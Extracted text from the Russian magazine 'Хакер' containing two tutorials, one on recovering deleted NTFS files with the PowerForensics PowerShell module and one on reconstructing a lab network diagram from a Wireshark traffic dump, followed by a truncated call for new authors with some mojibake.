                       на этом томе в NTFS чаще  всего  происходят
                        изменения даже без прямого участия пользовате‐
                           ля, что может повлиять на восстановление утра‐
                          ченной  информации.  Данные  после  удаления
                       на этом дисковом разделе могут быть переза‐
                         писаны системными файлами.


В файловой системе NTFS работает принцип «все есть файл». Файл же имеет
определенный набор атрибутов. Мы не будем разбирать все атрибуты фай‐
лов, затронем только самые важные: $STANDARD_INFO, $FILE_NAME, $DATA.
  В атрибутах $STANDARD_INFO и $FILE_NAME записаны метки времени, под‐
робнее о них мы поговорим позже, а в атрибуте $DATA хранится содержимое
резидентного файла. В случае с нерезидентными файлами там располага‐
ются «ссылки» на разбросанное по секторам содержимое файла, называ‐
емое data runs или отрезками. Отрезки представляют собой последователь‐
ность кластеров, которые хранят содержимое нерезидентного файла, а в
качестве упомянутых «ссылок» в атрибуте $DATA используется номер началь‐
ного кластера и количество идущих следом кластеров. Как видишь, матема‐
тика простая: если файл нерезидентный (больше 720 байт), нам нужно найти
кластер, с которого он начинается, и собрать все кластеры воедино в верном
порядке, а после записать содержимое кластеров в новый файл.
  Все файловые атрибуты хранятся в файловой записи (File Record) таблицы
Master File Table ($mft). Это наиважнейший служебный файл (оттого он имеет
резервную копию $mftmirr), так как содержит в себе информацию обо всех
файлах и директориях на томе. Имея на руках только файл $mft, можно выс‐
троить хронологию связанных с файлами событий, а в некоторых случаях —
восстановить файлы.
  Еще один важный служебный файл — карта свободного пространства
$BitMap. С ее помощью отслеживаются все используемые и неиспользуемые
кластеры, что, конечно же, напрямую связано с созданием и удалением фай‐
лов или директорий. Кластер же в NTFS — минимальная единица дискового
пространства, доступного для размещения файлов и директорий в файловой
системе NTFS. По умолчанию размер кластера равен 4096 Kбайт, но при соз‐
дании тома можно задать иной размер.
   Процесс удаления файла подробно описан в книге Криса, также информа‐
цию можно найти в статье «Разгребаем руины. Как восстановить удаленные
файлы на разделах NTFS».


РЕЗИДЕНТНЫЕ И НЕРЕЗИДЕНТНЫЕ ФАЙЛЫ АТРИБУТЫ

Некоторые материалы, посвященные файловой системе NTFS v3.1, упомина‐
ют о резидентных и нерезидентных файлах. Резидентными файлами считают‐
ся те, размер которых меньше или равен 720 байт (это количество байтов
было получено исключительно опытным путем в NTFS v3.1 в Windows 10, хотя
в других источниках читатель может найти иную информацию о максимальном
размере резидентного файла: он варьируется от 700 байт до 1 Кбайт). Такие
файлы хранят все содержимое в $mft (Master File Table), и в этом случае флаг
нерезидентности (Non-resident flag) у них равен 00h. Для нерезидентных фай‐
лов (строго больше 720 байт) флаг Non-resident flag равен 01h.
  На самом деле флаг резидентности присущ каждому атрибуту файла
в отдельности (в том числе $FN, $SI и другим атрибутам), а не самому файлу
как таковому. Несмотря на наличие такого флага у каждого атрибута, сущес‐
твуют исключительно резидентные атрибуты, которые хранят свои данные
только   в   файле  $mft   (например,   $FILE_NAME,  $STANDARD_INFO,
$VOLUME_NAME). Есть атрибуты, которые могут быть как резидентными, так
и нерезидентными (это справедливо по отношению к атрибутам $DATA, $EA
и другим). Наконец, существуют файловые атрибуты, которые хранят свои
данные исключительно за пределами $mft, то есть являются строго нерези‐
дентными ($BITMAP, $REPARSE_POINT, $SECURITY_DESCRIPTOR и прочие).


Время и атрибуты $STANDARD_INFO и $FILE_NAME
При создании файла на томе, перемещении между томами и практически
любых манипуляциях с файлами (переименование, локальное перемещение,
доступ  внутри одного тома, изменение)  у файла  изменяются атрибуты
$STANDARD_INFO (далее — $SI) и $FILE_NAME (далее — $FN). В них указано
время, когда произошло действие с файлом.
  В следующих таблицах показано, какие атрибуты файлов $SI и $FN меня‐
ются и при каких действиях с файлом.





                    Изменение атрибута $FILE_NAME





                 Изменение атрибута $STANDARD_INFO

Здесь
 • Modification — изменение атрибутов $Data и $INDEX;
 • Accessed — обращение к содержимому файла;
 • Change (MFT) — запись в таблицу MFT (не отображается в Windows);
 • BornTime или birthday of file — создание файла.

Важно,  что при  удалении  через  del  или  erase  атрибуты $FILE_NAME
и $STANDARD_INFO не изменяются.
   Зная метки времени определенных файлов и правила изменения атри‐
бутов, специалист по расследованию инцидентов способен выстроить вер‐
ную хронологию событий. Время, в которое произошли те или иные действия
с файлами, при проведении криминалистического расследования может
стать одним из важнейших артефактов.


                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ

     ВОСКРЕШЕНИЮ
         ПОДЛЕЖИТ
                     ВОССТАНАВЛИВАЕМ ФАЙЛЫ
           В NTFS С ИСПОЛЬЗОВАНИЕМ POWERSHELL





ВОССТАНОВЛЕНИЕ ФАЙЛОВ, УДАЛЕННЫХ С ИСПОЛЬЗОВАНИЕМ
DEL ИЛИ ERASE

Настало время приступить к практической части, чтобы закрепить теорию
и поупражняться в восстановлении удаленных файлов. Но для начала следует
выделить два способа удаления файлов в Windows:
 • удаление c использованием системных утилит del (Shift-Del) или erase;
 • удаление через корзину.

Такое разделение связано с разницей в механизме удаления и некоторым
отличием при восстановлении файлов.


           WARNING

                             Никогда не  восстанавливай  удаленные  файлы
                       на тот же том, с которого они были удалены. Луч‐
                   ше всего использовать отдельный носитель.


В первую очередь разберемся с восстановлением нерезидентных файлов,
а дальше посмотрим, как восстанавливать резидентные. Итак, практиковать‐
ся мы будем с использованием PowerShell-модуля PowerForensics авторства
Джареда Эткинсона. Этот модуль прост в установке и содержит полезные
командлеты для работы с файловыми системами NTFS и FAT. Он позволяет
работать с системными файлами Windows и парсить атрибуты файлов NTFS,
конвертировать метки времени из байтового представления в человекочи‐
таемое (что необходимо в форензике). Подробнее узнать о возможностях
модуля можно из его описания.
  Для начала установим этот модуль (нужно запускать PowerShell от имени
администратора, поскольку при чтении служебных файлов требуются при‐
вилегии локального администратора):


Import-Module PowerForensics

Проверим, что все прошло успешно, для этого выполним командлет


Get-Command - Module PowerForensics





                        Установка модуля PowerForensics

Установка модуля завершена, теперь давай найдем все удаленные файлы
на томе. В главной файловой таблице они имеют флаг удаления 00h по сме‐
щению 16 байт от начала файловой записи.
   Как уже было сказано в теоретической части, в Windows постоянно про‐
исходят изменения, какие‑то файлы удаляются, а какие‑то, наоборот, соз‐
даются (например, начиная с Windows 8 количество файлов Prefetch огра‐
ничено 1024, поэтому старые  удаляются системой, а новые  создаются
при запуске исполняемых файлов).
  Для чистоты эксперимента создадим том F (запускаем diskmgmt.msc,
затем сжимаем имеющийся том и отдаем для нового 5 Гбайт с дефолтным
размером кластера 4096 Кбайт). Поместим туда файл (в роли подопытного
будет выступать калькулятор, но читатель может использовать любой другой
файл) calc.exe и удалим его через erase (то же самое будет при удалении
через del или Shift-Del).
   Теперь для поиска удаленного файла на томе F воспользуемся командле‐
том  Get-ForensicsFileRecord  и  отфильтруем  вывод  по  флагу  True
для атрибута Deleted:


Get-ForensicFileRecord -VolumeName F: | Where-Object {$_.Deleted}





                    Получение удаленных файлов на томе F

Здесь мы видим основные файловые атрибуты и их значения, однако для вос‐
становления нам потребуется значение файловой записи RecordNumber.
После того как файл будет найден, для дальнейших действий лучше поль‐
зоваться номером файловой записи, так как имя файла может изменяться
в процессе удаления (далее мы разберем этот случай). Имея номер фай‐
ловой записи, мы сможем отыскать недостающие элементы, если файл
нерезидентный, и собрать его воедино по кусочкам, после чего записать
содержимое в новый файл.
  Для этого запишем в переменную $file_record объект файла со свой‐
ствами (атрибутами файла):


$file_record = Get-ForensicFileRecord -VolumeName F: -Index 43

Теперь мы можем обратиться к отдельному атрибуту и узнать интересующую
нас информацию. Для восстановления нам нужно определить номер началь‐
ного кластера и общее количество занимаемых файлом кластеров. Для этого
в переменную $file_descriptor запишем содержимое атрибута $DATA:


$file_descriptor=$file_record.Attribute | Where-Object {$_.name -eq
'DATA'}`

После чего мы можем получить значения начального кластера и количества
кластеров, которые занимает наш файл. В переменную $start_cluster сох‐
раним эти данные:


$start_cluster = $file_descriptor.DataRun | select *

На рисунке справа мы видим содержимое этой переменной в консоли
PowerShell, а слева — атрибут $Data с его полями для нашего удаленного
файла.





          Начальный кластер и количество используемых кластеров

Теперь дело за малым: нужно записать содержимое по «адресу» выше
(номер начального кластера и количество кластеров) в восстановленный
файл на томе.
   Будем записывать на том С:, чтобы не затереть удаленные данные на томе
F:. Можно выполнить запись при помощи командлета Invoke-ForensicDD
из модуля PowerForensics или использовать WriteAllBytes из библиотеки
System.IO.File:


Invoke-ForensicDD -InFile \\ .\F : -Offset ($st_cl.StartCluster* 4096)
-BlockSize ($st_cl.ClusterLength* 4096) -Count 1 -OutFile C:\calc.exe

Здесь мы указываем в параметре InFile том и расположение файла,
который будет скопирован (в нашем случае это том F и расположение уда‐
ленного файла). В качестве смещения на диске указываем адрес начального
кластера, умноженный на 4096, и количество кластеров, также умноженных
на 4096, ведь размер кластера на нашем томе равен 4096 Кбайт. После чего
указываем количество файлов на диске и путь с именем файла, куда будет
восстановлен наш файл.
  В результате мы получаем наш рабочий калькулятор в корне тома C:\
calc.exe.





                         Восстановление калькулятора

Вот  только есть одно но: несмотря на то что калькулятор  запускается
и работает без нареканий, хеш‑суммы оригинального файла (до удаления)
и файла после восстановления не бьются…





Причина тому — разница в размере файла после восстановления. Размер
файла до удаления равен 27 648 байт, а после восстановления — 28 672 (что
при делении на 4096 дает нам 7 — те самые семь кластеров в сумме). То есть
при восстановлении мы заботливо дозаписали нулями 1024 байт, это нужно
и важно учитывать при получении оригинального файла. Значения реального
размера файла (RealSize=27 648) и выделенного под хранение файла прос‐
транства   (AllocationSize=28  672)  хранятся  в  атрибуте  $DATA.  Вся
информация у нас на руках, давай наведем красоту. Для этого, прежде чем
сохранить  содержимое  кластеров  в  файл,  запишем  массив  байтов
в переменную $bytearray:


$bytearray = Invoke-ForensicDD -InFile \\ .\F : -Offset ($st_cl.
StartCluster* 4096) -BlockSize ($st_cl.ClusterLength* 4096) -Count 1

После  чего,  используя функцию WriteAllBytes  системной  библиотеки
System.IO.File, запишем содержимое в файл, указав верхнюю границу мас‐
сива для записи [0..($bytearray.Length - (1024 + 1))]:


[System.IO.File]::WriteAllBytes("C:\calc.exe" ,$bytearray[ 0..(
$bytearray.Length - (1024 + 1))])

Теперь посчитаем хеш‑суммы и сравним полученные значения.





                               Запись в файл

Как и ожидалось, хеш‑суммы бьются, значит, после восстановления содер‐
жимое  файла  изменено не было. Если с  восстановлением  удаленных
с использованием del (Shift-Del) или erase файлов все понятно, то что про‐
исходит в системе, когда ты перемещаешь файл в корзину?


ВОССТАНОВЛЕНИЕ ФАЙЛОВ, УДАЛЕННЫХ ЧЕРЕЗ КОРЗИНУ

Сразу следует отметить, что перемещение файла в корзину не равно уда‐
лению: файл удаляется после очистки корзины (хоть это и очевидно, тем
не менее упомянуть об этом стоит).
   После перемещения файла в корзину в директории C:\$Recycle.Bin\<
User’s SID>\ создается два файла c именами, которые начинаются с $I и $R
и заканчиваются оригинальным расширением перемещенного в корзину
файла. Даже с отображением скрытых файлов в директории нам не удастся
посмотреть на созданные после перемещения в корзину файлы. Чтобы
до них добраться, содержимое директории C:\$Recycle.Bin\<User’s SID>
\ нужно переместить в специально созданную для исследования директорию
(можно воспользоваться PowerShell-командлетом Copy-Item). После переме‐
щения нам станут доступны следующие файлы:
 1. $I<random>.original_extension (далее — $I ) — файл с метадан‐
   ными, создается, как только файл перемещается в корзину. Он исполь‐
   зуется для восстановления файла из корзины средствами Microsoft, под‐
   робнее разбор файла будет приведен ниже.
 2. $R<random>.original_extension (далее — $R ) — файл, который соз‐
   дается после перемещения в корзину. Это копия перемещенного в кор‐
   зину файла, о чем говорят одинаковое содержимое и хеш‑суммы (если
   сравнить оригинал до удаления и перемещенный файл). Изменяется толь‐
   ко имя файла.





                   После перемещения файла в корзину

Разбор содержимого популярных файлов и файловых записей, а также струк‐
тур таблиц MFT, MBR, GPT и файловых атрибутов встречается в публикациях
на GitHub. Однако мне не удалось найти описание файла $I с метаданными,
поэтому давай вместе разберемся, что полезного можно обнаружить в таком
файле.
  В роли  подопытного будет по‑прежнему  выступать файл calc.exe.
Переместим его копию в корзину, после чего скопируем все содержимое
из директории C:\$Recycle.Bin\<User’s SID>\* в папку для исследования.
   Ниже представлен разбор всех полей файла $IOWX1VN.exe (был создан
при перемещении калькулятора в корзину).





Здесь:
 • желтый цвет — File Header, заголовок файла $I ;
 • синий цвет — File Size (Bytes) — размер файла;
 • красный цвет — атрибут $SI ChangedTime — время удаления, точнее,
   перемещения файла в корзину в формате UTC;
 • бирюзовый цвет — FileName Length — размер имени файла в байтах;
 • пурпурный цвет — File Path — полный путь до файла, который был удален
   (перемещен в корзину).

У каждого пользователя своя $Recycle.Bin (корзина). Более того, на каждом
томе такая корзина создается по умолчанию. Грубо говоря, корзина из тома
С пробрасывается в том F и другие созданные тома. Поэтому перед именем
удаленного файла мы видим SID пользователя — зачастую это полезная
информация о том, какой пользователь в системе переместил файл в корзину
и выполнил удаление. Например, для файла calc.exe полное имя файла
будет выглядеть так:


F:\$RECYCLE.BIN\S-1-5-21-3457051395-4168275294-665325124-1000\
$ROWX1VN.exe

либо


F:\$RECYCLE.BIN\S-1-5-21-3457051395-4168275294-665325124-1000\
$IOWX1VN.exe

Кроме информации о том, кто удалил файл, мы получаем информацию о мет‐
ках времени и о моменте, когда файл был перемещен в корзину. Также нам
становится известен путь, по которому хранился файл до перемещения.
Как изменяются метки времени, я рассказывал в теоретической части.
   Теперь давай поговорим о восстановлении файла, который был удален
через корзину. По алгоритму оно похоже на восстановление файлов, удален‐
ных с помощью del или erase, поскольку для файловой системы нет разницы
между файлами, удаленными из корзины или какой‑либо другой директории.
По сути, система удаляет файлы так же, как при применении утилит del
или erase,  только предварительно переименовав файлы в $R<random>.
extension и $I<random>.extension — именно такие записи хранятся в глав‐
ной файловой таблице $mft.
   Вероятно, у читателя возник вполне логичный вопрос: какой из двух фай‐
лов восстанавливать — $I или $R? Ведь при очистке корзины удалятся оба
эти файла и их записи какое‑то время будут храниться в $mft (до перезаписи
другими данными).
  Для восстановления удаленного файла нам нужны оба: и $R, и $I. Файл $R
требуется для восстановления содержимого, а файл $I — для получения ори‐
гинального имени файла.
   Единственный недостающий элемент при восстановлении — оригиналь‐
ное имя, которое можно отыскать только в файле $I. Но файл $I резиден‐
тный, а это значит, что пришло время разобраться, как восстанавливать
резидентные файлы.
  Для начала мы также найдем ID файловой записи для файла $I:


Get-ForensicFileRecord -VolumeName F:| where {$_.Deleted}
$file_record = Get-ForensicFileRecord -VolumeName F: -Index 44

После чего обратимся к атрибуту $DATA по указанному ID и запишем содер‐
жимое атрибута в массив байтов:


$file_descriptor=$file_record.Attribute | Where-Object {$_.name -eq
'DATA'}
$Byte_Array = $file_descriptor.RawData

В $Byte_Array хранится содержимое резидентного файла.
   Структуру файла $I мы уже разобрали и помним, что байты с 0 до 26 отво‐
дятся на файловый заголовок, размер файла в байтах, атрибут $SI Changed
Time и размер файлового имени. А начиная с индекса 27 до конца файла хра‐
нится полное имя файла (путь + имя). Зная эту информацию, мы можем
получить недостающий элемент для восстановления нашего калькулятора.
  Для этого мы декодируем значения массива с индекса 27 до конца мас‐
сива в UTF8 и воспользуемся командлетом Split-Path, чтобы получить только
имя файла:


$filename = Split-Path -Path ([System.Text.Encoding]::UTF8.GetString(
$Byte_Array[ 27..$Byte_Array.Length])) -Leaf





Все данные для восстановления нерезидентного файла $ROWX1VN.exe у нас
есть, и способ мы уже изучили, поэтому дело за малым. Готовый сценарий
для восстановления удаленных через корзину файлов можно найти на GitHub.


ВЫВОДЫ

Восстановление удаленных файлов — задача довольно кропотливая и инте‐
ресная. Хотя автоматизированных средств для этого предостаточно, лучше
не доводить дело до потери данных. Чтобы обезопасить себя от утраты цен‐
ной информации, не забывай создавать бэкапы и хранить их по принципу 3-2-
1.
   Думаю, что с полученными знаниями читателю не составит труда раз‐
работать собственную программу для автоматизации процесса восстанов‐
ления. Ведь, как писал Крис в своей книге, «настоящий хакер сам разрабаты‐
вает свой инструментарий».
АДМИН

  УВИДЕТЬ
     СЕТЬ

                ВОССОЗДАЕМ СХЕМУ
                    ПОДКЛЮЧЕНИЙ
                 ИЗ ДАМПА ТРАФИКА





Изучение  структуры  сетевых  протоколов
поможет тебе более глубоко понять прин‐
цип их работы и функции. В этой статье мы
проанализируем   небольшой   фрагмент
                                                                                  Alexander Mikhailovсетевого трафика и зарисуем предполага‐                                                                                        mikhailov.alexander99@yandex.ru
емую схему сети, исходя из полученных
данных.


Я сформировал дамп сетевого трафика на своем лабораторном стенде
с помощью фильтра захвата (Capture Filtering) в Wireshark с некоторыми усло‐
виями. Вот что из этого вышло.





Мы будем  раскрывать по  порядку каждый  захваченный пакет и искать
в  инкапсулируемых  данных  интересующую  нас  информацию  о  схеме
исходной сети. Затем мы изобразим эту информацию графически (для этого
будем использовать ресурс diagrams.net).


УЗНАЕМ КАНАЛЬНЫЕ И СЕТЕВЫЕ АДРЕСА ПЕРВЫХ УСТРОЙСТВ

Из первых четырех пакетов сразу видно, что некое устройство получает IP-
адрес и другие сетевые параметры по DHCP. Раскрываем первый пакет.





Сразу бросается в глаза MAC-адрес клиентского устройства. Сетевой адрес
этого девайса нам пока неизвестен, потому что он еще не получил его,
а адреса назначения — широковещательные.
  Идем дальше. Возможно, ты обратил внимание на IP-адрес 192.168.30.2
в разделе заголовка 50 DHCP. Это означает, что клиент запрашивает именно
этот IP-адрес, так как ранее, возможно, он его уже получал. Но пока мы
не станем отображать его на схеме и дождемся окончательного ответа
от DHCP-сервера.
  И последнее, что нам интересно в этом пакете, — опция 12 DHCP. Здесь
отображается имя устройства. Теперь перенесем полученные данные на схе‐
му.





Следующий пакет DHCP Offer — в ответе на сообщение клиента сервер пред‐
лагает возможные сетевые параметры.





Как мы видим, на запрос клиента ответил DHCP-сервер с IP-адресом 192.
168.30.1 и MAC-адресом 00:19:56:bb:41:09. Он предложил клиенту IP-
адрес 192.168.30.2 (кстати, тот, который клиент и запрашивал, поле Your IP
address) и маску сети 255.255.255.128. Отлично, дополним схему новыми
данными.





Новые элементы я буду окрашивать в красный цвет для наглядности.


MICROSOFT WINDOWS И CISCO IOS, ИЛИ ПРИ ЧЕМ ЗДЕСЬ TTL?

Сообщение DHCP Request не несет в себе новой информации, кроме того,
что в опции 55 клиент запрашивает дополнительные параметры у DHCP-сер‐
вера: сетевую маску, адрес шлюза, сервер DNS и доменное имя.





Еще хочу обратить внимание на поле Time to Live заголовка IPv4 данного
сообщения.





TTL — значение, которое определяет время жизни пакета. Это значение дек‐
рементируется на единицу каждый раз, когда пакет проходит через маршру‐
тизирующее устройство по пути к месту назначения.
   Дело в том, что по умолчанию для разных операционных систем типичны
свои значения TTL.





Поскольку в клиентском сообщении DHCP Request TTL имеет значение 128,
мы можем предположить, что это устройство под управлением ОС Windows.





Последнее сообщение, свидетельствующее об успешном окончании взаимо‐
действия клиента и DHCP-сервера, — DHCP ACK.





В этом сообщении DHCP-сервер присваивает клиенту:
 • IP-адрес 192.168.30.2 (поле Your IP address);
 • маску сети 255.255.255.128 (опция 1);
 • шлюз 192.168.30.1 (опция 3);
 • DNS 8.8.8.8 (опция 6).

Здесь также задаются временные интервалы аренды адреса, его продления
и запроса адреса от других локальных DHCP-серверов, в случае если преж‐
ний сервер недоступен (опции 51, 58 и 59 соответственно).
  И напоследок глянем на TTL IP-пакета от DHCP-сервера.





Значение 255 указывает на Cisco IOS. Можно даже проверить производителя
устройства по MAC-адресу на онлайн‑сервисах, которых полно в интернете.





Получается, что в качестве DHCP-сервера в сети функционирует маршру‐
тизатор Cisco. Исследовав четыре перехваченных пакета, можем пред‐
положить следующую схему сети.





РАСКРЫВАЕМ ARP И TCP

Раскроем пятый по очереди пакет (а точнее, кадр) ARP.





Здесь хост 192.168.30.2 с помощью широковещательной рассылки пыта‐
ется выяснить MAC-адрес у хоста 192.168.30.48. Значение 1 в поле Opcode
означает, что это именно запрос, а значение 2 — ответ. И если посмотреть
на полный скрин дампа в начале статьи, то мы не увидим там ответа на ARP-
запрос. Поэтому существование хоста 192.168.30.48 ставится под вопрос.





Двигаемся дальше и смотрим на пакеты 6 и 7. Они, в принципе, одинаковые.





Хост 192.168.20.27, не получив ответа, пытается повторно установить TCP-
сессию с веб‑сервером (о чем  свидетельствует порт назначения 443),
отправляя  SYN-запросы.  Отобразим  на  схеме  веб‑сервер  и  хост
под управлением Windows (поскольку TTL = 128).





                                     Продолжение статьи →
АДМИН               ← НАЧАЛО СТАТЬИ

       УВИДЕТЬ СЕТЬ
              ВОССОЗДАЕМ СХЕМУ ПОДКЛЮЧЕНИЙ
                           ИЗ ДАМПА ТРАФИКА





МНОГО ЛИ МОЖЕТ РАССКАЗАТЬ CDP?

Протокол CDP  служит  для  обнаружения  соседних  сетевых  устройств
под управлением Cisco IOS и может предоставить много полезной информа‐
ции. Рассмотрим подробно его самые интересные поля.





В первую очередь смотрим на несущий Ethernet-кадр и определяем, что
адрес назначения мультикастовый. А если глянуть на адрес источника (00:
19:56:bb:41:09), то становится понятно, что это MAC-адрес того самого
маршрутизатора на нашей схеме.
  Идем дальше и обращаем внимание на поле Device ID, которому прис‐
воено значение gateway. Это не что иное, как имя устройства, которое зада‐
ется командой hostname в Cisco IOS.
   Следующие поля — Software Version и Platform — обозначают версию
прошивки и модель самого устройства соответственно. Итак, мы имеем дело
с маршрутизатором Cisco 2821 с установленным программным обеспечени‐
ем C2800NM-ADVIPSERVICESK9-M, Version  12.4(3f), RELEASE SOFTWARE
(fc3). Отобразим эту информацию на схеме и пойдем дальше.





Поле Port ID содержит название и номер порта устройства, через который
был   отправлен   данный  CDP-пакет.  В  нашем   случае   это  порт
GigabitEthernet0/1. Теперь давай собирать пазл: только что мы выяснили,
что пакет CDP отправлялся через порт G0/1, а MAC-адрес отправителя
в Ethernet-заголовке 00:19:56:bb:41:09. Делаем вывод, что MAC-адрес 00:
19:56:bb:41:09 принадлежит порту G0/1.





Но это еще не все. Смотрим на поле Addresses и видим значение 192.168.
20.1. Это свидетельствует о том, что интерфейс, с которого был отправлен
CDP-пакет (G0/1), имеет IP-адрес 192.168.20.1. Вроде бы ничего примеча‐
тельного, но давай вернемся назад и посмотрим на четвертый пакет DHCP
ACK: в этом сообщении клиенту отвечал DHCP-сервер с IP-адресом 192.
168.30.1 и — внимание — MAC-адресом 00:19:56:bb:41:09! А ведь до это‐
го мы определили, что порт G0/1 имеет IP-адрес 192.168.20.1 и MAC-адрес
00:19:56:bb:41:09. Выходит, на порте G0/1 висит два айпишника: 192.168.
20.1 и 192.168.30.1.
   Как так получается? А все дело в «роутере на палочке» — router on a
stick — способе маршрутизации между VLAN. В таком варианте маршрутиза‐
ции роутер соединяется с коммутатором единственным проводом, а на
физическом интерфейсе роутера создаются логические субинтерфейсы (они
еще называются подынтерфейсы), которым назначаются IP-адреса из разных
подсетей. Причем MAC-адреса у них идентичные, так как они часть одного
физического  порта  (в нашем  случае  порта G0/1). Давай  максимально
незамысловато отобразим это на схеме.





И раз мы уже выяснили, что в данной сети есть как минимум два компьютера,
которые имеют связь с одним физическим интерфейсом маршрутизатора, то,
скорее всего, между ними стоит какой‑нибудь коммутатор.





Последнее поле, которое мы изучим в CDP-пакете, — это поле IP Prefixes.
В нашем случае оно имеет три значения: 192.168.30.0/25, 192.168.20.0/
27 и 66.1.66.0/24. Каждое значение представляет один из непосредственно
подключенных  к роутеру сегментов IP-сети. Про сети 192.168.30.0/25
и 192.168.20.0/27 мы уже знаем, а вот сегмент 66.1.66.0/24 видим впер‐
вые. Тем не менее один из интерфейсов маршрутизатора входит в этот сег‐
мент сети.


ROUTING INFORMATION PROTOCOL





RIP — устаревший внутренний протокол динамической маршрутизации. Его
характеризует 520-й UDP-порт, мультикастовый IP-адрес 224.0.0.9 и муль‐
тикастовый MAC-адрес.
  MAC-адрес отправителя уже до боли знакомый. Значит, это сообщение
было отправлено во внутреннюю пользовательскую сеть, где, скорее всего,
нет других роутеров. Таким образом, на этом роутере не сконфигурирован
порт G0/1 как пассивный.
   Возможно, смотря на TTL, ты ожидал увидеть значение 1, а на деле оно
равно 2. Это сделано для того, чтобы протокол RIP мог работать в NBMA-
сетях. В общем, здесь ничего интересного. Рассмотрим непосредственно
сам заголовок RIP.
   Итак, поле Command обозначает тип сообщения: для запроса значение
устанавливается в 1, а для отклика или ответа — в 2. Но это не значит, что
кто‑то запросил маршрутную информацию от нашего роутера, так как RIP
каждые несколько секунд сам ее рассылает.
   Поле Version, как ни странно, означает версию протокола RIP. Вторая вер‐
сия отличается от первой лишь тем, что поддерживает бесклассовую адре‐
сацию. Простыми словами, RIPv2, помимо данных о сетях, передает сведения
о масках этих сетей и тем самым в современных реалиях имеет хоть какой‑то
шанс на существование.
  И самое  интересное — это  поля, отображающие  данные о  сетях,
до которых можно добраться через наш маршрутизатор. IP Address — здесь
отображается адрес сети назначения. В нашем примере их два: 192.168.30.
0 и 66.1.66.0. Метрика у обоих маршрутов равна единице. Это значит, что,
чтобы добраться до этих сетей, другому роутеру нужно сделать один переход
до места назначения. Значение поля Netmask, думаю, не нуждается в объ‐
яснении.
   Router Tag, или метка маршрута, используется для того, чтобы обес‐
печить разделение внутренних маршрутов (маршруты для сетей в пределах
домена маршрутизации RIP) от внешних, которые, возможно, были импорти‐
рованы из EGP или другого IGP.
   Значение Next Hop выставляется как 0.0.0.0 в том случае, если сеть нап‐
рямую подсоединена к роутеру, тем самым роутер‑отправитель говорит, что
он является хопом по пути к сети назначения.
   Возможно, у тебя возник вопрос: почему в анонсе нет сети 192.168.20.0?
Если взглянуть на IP-заголовок, то видно, что IP-адрес источника — 192.168.
20.1, который как раз таки входит в сеть 192.168.20.0. Поэтому анон‐
сировать информацию об этой же сети ей же просто не нужно.
   Итак, анализируя пакет RIP, мы подтвердили, что сеть 66.1.66.0/24 нап‐
рямую присоединена к нашему маршрутизатору.





THREE-WAY HANDSHAKE И HTTP-ЗАПРОС





Здесь мы снова видим TCP-протокол, однако IP- и MAC-адреса нам нез‐
накомы. Давай их изучать. Некий 192.168.20.2 с MAC-адресом f0:bf:97:
6a:a0:8b хочет установить связь с неким 5.9.243.178, отправляя SYN-зап‐
рос на шлюз по умолчанию 00:19:56:bb:41:09 (Cisco Router).
   Кроме того, в TCP-заголовке виден всем известный 80-й порт назначения.
То есть хост 192.168.20.2 пытается установить TCP-сессию с HTTP-сер‐
вером. Также, если посмотреть на TTL (оно равно 64), можно предположить,
что инициатором установления сессии выступает Unix-система. Добавим эту
информацию на схему.





По 11-му и 12-му пакетам, очевидно, идет продолжение установки TCP-сес‐
сии и сервер в сторону клиента отправляет пару флагов SYN/ACK. Опять же
смотрим на TTL сервера: значение равно 49, что также предположительно
указывает на ОС Unix на стороне веб‑сервера. Ведь пакет от сервера про‐
ходит определенное количество маршрутизирующих устройств, которые каж‐
дый раз уменьшают величину TTL на единицу.





Ну и только после завершения установки TCP-сессии клиент формирует
HTTP-запрос. Поглядим на него.





Тут, кроме того, что клиент запрашивает веб‑страницу http://xgu.ru/wiki/
HSRP, нет ничего интересного.
   Наконец мы рассмотрели последний перехваченный пакет и получили сле‐
дующую картину.





Тут мы отобразили все интересующие нас данные, взятые из дампа. Осталось
навести марафет, чтобы схема выглядела более понятной.





ВЫВОДЫ

Мы проанализировали всего тринадцать сетевых пакетов и извлекли из них
много ценной информации об исходной сети. Этот подход к визуализации
будет полезен, к примеру, при поиске инцидентов в сети и траблшутинге.
Как минимум подобное «чтение» сетевого трафика повысит твой скилл
в сетевых технологиях и прокачает понимание принципов взаимодействия
сетевых устройств и протоколов.
   СТАНЬ АВТОРОМ
     «ХАКЕРА»!


«Хакеру» нужны новые авторы, и ты можешь стать одним
из них! Если тебе интересно то, о чем мы пишем, и есть
желание исследовать эти темы вместе с нами, то не упусти
возможность вступить в ряды наших авторов и получать
за это все, что им причитается.


 • Àâòîðû ïîëó÷àþò äåíåæíîå âîçíàãðàæäåíèå. Размер  зависит
   от сложности и уникальности темы и объема проделанной работы (но
   не от объема текста).
 • Íàøè àâòîðû ÷èòàþò «Õàêåð» áåñïëàòíî: каждая опубликованная
   статья приносит месяц подписки и значительно увеличивает личную скид-
    ку. Уже после третьего раза подписка станет бесплатной навсегда.

Кроме того, íàëè÷èå ïóáëèêàöèé — ýòî îòëè÷íûé ñïîñîá ïîêàçàòü
ðàáîòîäàòåëþ è êîëëåãàì, ÷òî òû â òåìå. А еще мы планируем запуск
англоязычной версии, так что ó òåáÿ áóäåò øàíñ áûòü óçíàííûì è çà
ðóáåæîì.
  И конечно, ìû âñåãäà óêàçûâàåì â ñòàòüÿõ èìÿ èëè ïñåâäîíèì
àâòîðà. На сайте ты можешь сам заполнить характеристику, поставить фото,
написать что-то о себе, добавить ссылку на сайт и профили в соцсетях. Или,
наоборот, не делать этого в целях конспирации.


ß ÒÅÕÍÀÐÜ, À ÍÅ ÆÓÐÍÀËÈÑÒ. ÏÎËÓ×ÈÒÑß ËÈ Ó ÌÅÍß ÍÀÏÈÑÀÒÜ
ÑÒÀÒÜÞ?
Главное в нашем деле — знания по теме, а не корочки журналиста. Знаешь
тему — значит, и написать сможешь. Не умеешь — поможем, будешь сом-
неваться — поддержим, накосячишь — отредактируем. Не зря у нас работает
столько редакторов! Они не только правят буквы, но и помогают с темами
и форматом и «причесывают» авторский текст, если в этом есть необ-
ходимость. И конечно, перед публикацией мы согласуем с автором все прав-
ки и вносим новые, если нужно.


ÊÀÊ ÏÐÈÄÓÌÀÒÜ ÒÅÌÓ?
Темы для статей — дело непростое, но и не такое сложное, как может
показаться. Стоит начать, и ты наверняка будешь придумывать темы одну
за другой!
  Первым делом задай себе несколько простых вопросов:
 • «Ðàçáèðàþñü ëè ÿ â ÷åì‑òî, ÷òî ìîæåò çàèíòåðåñîâàòü äðóãèõ?»
   Частый случай: люди делают что-то потрясающее, но считают свое
